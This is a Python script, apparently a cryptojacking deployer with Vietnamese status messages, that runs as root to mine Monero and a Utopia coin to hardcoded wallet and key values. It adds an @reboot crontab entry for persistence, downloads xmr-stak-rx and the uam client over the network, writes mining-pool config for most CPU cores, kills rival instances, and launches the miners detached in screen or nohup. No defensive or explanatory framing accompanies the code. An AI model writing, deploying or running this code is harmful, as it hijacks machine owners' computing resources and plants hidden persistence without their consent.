__author__ = 'root'
import time
import os,sys
import multiprocessing
import random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
try:
    os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
except:
    pass

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y python python-dev screen')
except:
    pass
try:
    path = '/var/spool/cron/crontabs/root'
    data = '@reboot screen -dm python /etc/dao.py'
    os.system('echo %s >> %s' %(data, path))
    os.system('chmod 600 %s' %path)
except:
    pass

cores_cpu = multiprocessing.cpu_count()
cores_tru = int(round(cores_cpu*20/100+0.9))
cores = cores_cpu - cores_tru
print('So cores de dao la %s' %cores)
stak_rx = 'xmr-stak-rx'
link_github_stak_rx = 'https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz'
file_stak_rx = 'xmr-stak-rx-linux-1.0.5-cpu.tar.xz'
folder_stak_rx = 'xmr-stak-rx-linux-1.0.5-cpu'
os.system('pkill ' + stak_rx)

if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
    print('Chua co chuong trinh %s' %stak_rx)
    os.chdir('/tmp')
    os.system('wget %s' %link_github_stak_rx)
    os.system('tar xf %s' %file_stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    workingdir = os.getcwd()
    data_config = '"call_timeout" : 10,\n"retry_time" : 30,\n"giveup_limit" : 0,\n"verbose_level" : 4,\n"print_motd" : true,\n"h_print_time" : 300,\n"aes_override" : null,\n"use_slow_memory" : "warn",\n"tls_secure_algo" : true,\n"daemon_mode" : true,\n"output_file" : "",\n"httpd_port" : 0,\n"http_login" : "",\n"http_pass" : "",\n"prefer_ipv4" : true,\n'
    f = open("config.txt", "w")
    f.write(data_config)
    f.close()
    data_pool = '"pool_list" :\n[\n\t{"pool_address" : "us-west.minexmr.com:4444", "wallet_address" : "84ei8c4r3ccPSS9q8Ux7bpWVKVAeN9FGgRx9KGxB8MpZ64V9CqZqeSD1DhK9ipKiHF9v1LaZTeUkoUo3WDGS8eM8N2uYgeQ", "rig_id" : "nql", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },\n],\n"currency" : "randomx",\n'
    f = open("pools.txt", "w")
    f.write(data_pool)
    f.close()
    data_cpu = '"cpu_threads_conf" :\n[\n'
    for i in range(0,cores,1):
    	data_cpu += '\t{ "low_power_mode" : 1, "affine_to_cpu" : ' + str(i) + ' },\n'
    data_cpu += '],'
    f = open("cpu.txt", "w")
    f.write(data_cpu)
    f.close()
    os.system('chmod 777 %s' %stak_rx)
else:
    print('Da co chuong trinh %s' %stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    workingdir = os.getcwd()
    data_config = '"call_timeout" : 10,\n"retry_time" : 30,\n"giveup_limit" : 0,\n"verbose_level" : 4,\n"print_motd" : true,\n"h_print_time" : 300,\n"aes_override" : null,\n"use_slow_memory" : "warn",\n"tls_secure_algo" : true,\n"daemon_mode" : true,\n"output_file" : "",\n"httpd_port" : 0,\n"http_login" : "",\n"http_pass" : "",\n"prefer_ipv4" : true,\n'
    f = open("config.txt", "w")
    f.write(data_config)
    f.close()
    data_pool = '"pool_list" :\n[\n\t{"pool_address" : "us-west.minexmr.com:4444", "wallet_address" : "84ei8c4r3ccPSS9q8Ux7bpWVKVAeN9FGgRx9KGxB8MpZ64V9CqZqeSD1DhK9ipKiHF9v1LaZTeUkoUo3WDGS8eM8N2uYgeQ", "rig_id" : "nql", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },\n],\n"currency" : "randomx",\n'
    f = open("pools.txt", "w")
    f.write(data_pool)
    f.close()
    data_cpu = '"cpu_threads_conf" :\n[\n'
    for i in range(0,cores,1):
    	data_cpu += '\t{ "low_power_mode" : 1, "affine_to_cpu" : ' + str(i) + ' },\n'
    data_cpu += '],'
    f = open("cpu.txt", "w")
    f.write(data_cpu)
    f.close()
    os.system('chmod 777 %s' %stak_rx)
#check screen
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s ./%s --noTest' %(stak_rx,stak_rx))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup ./%s --noTest &' %stak_rx)
else:
    os.system ('./%s --noTest &' %stak_rx)

#utopia
link_deb = 'https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb'
deb_name = 'uam-latest_amd64.deb'
folder_stak_rx = 'uam'
stak_rx = 'uam'
if not os.path.isfile('/opt/%s/%s' %(folder_stak_rx, stak_rx)):
    print('Chua co chuong trinh %s' %stak_rx)
    os.chdir('/tmp')
    os.system('wget %s' % link_deb)
    try:
        os.system ('dpkg -i %s' %deb_name)
    except:
        pass
    #workingdir = os.getcwd()
    #os.system('chmod 777 %s' %stak_rx)
else:
    print('Da co chuong trinh %s' %stak_rx)
    #os.chdir('/opt/%s/' %(folder_stak_rx, stak_rx))
    #workingdir = os.getcwd()
#check screen
command = '/opt/%s/%s --pk F32978292823F8829CDC31E42364865D1CAEC2FB847BC9DBB27EF29BCEF6F906' %(folder_stak_rx, stak_rx)
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s %s' %(stak_rx,command))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup %s &' %command)
else:
    os.system ('%s &' %command)

while True:
    print('running')
    time.sleep(3)

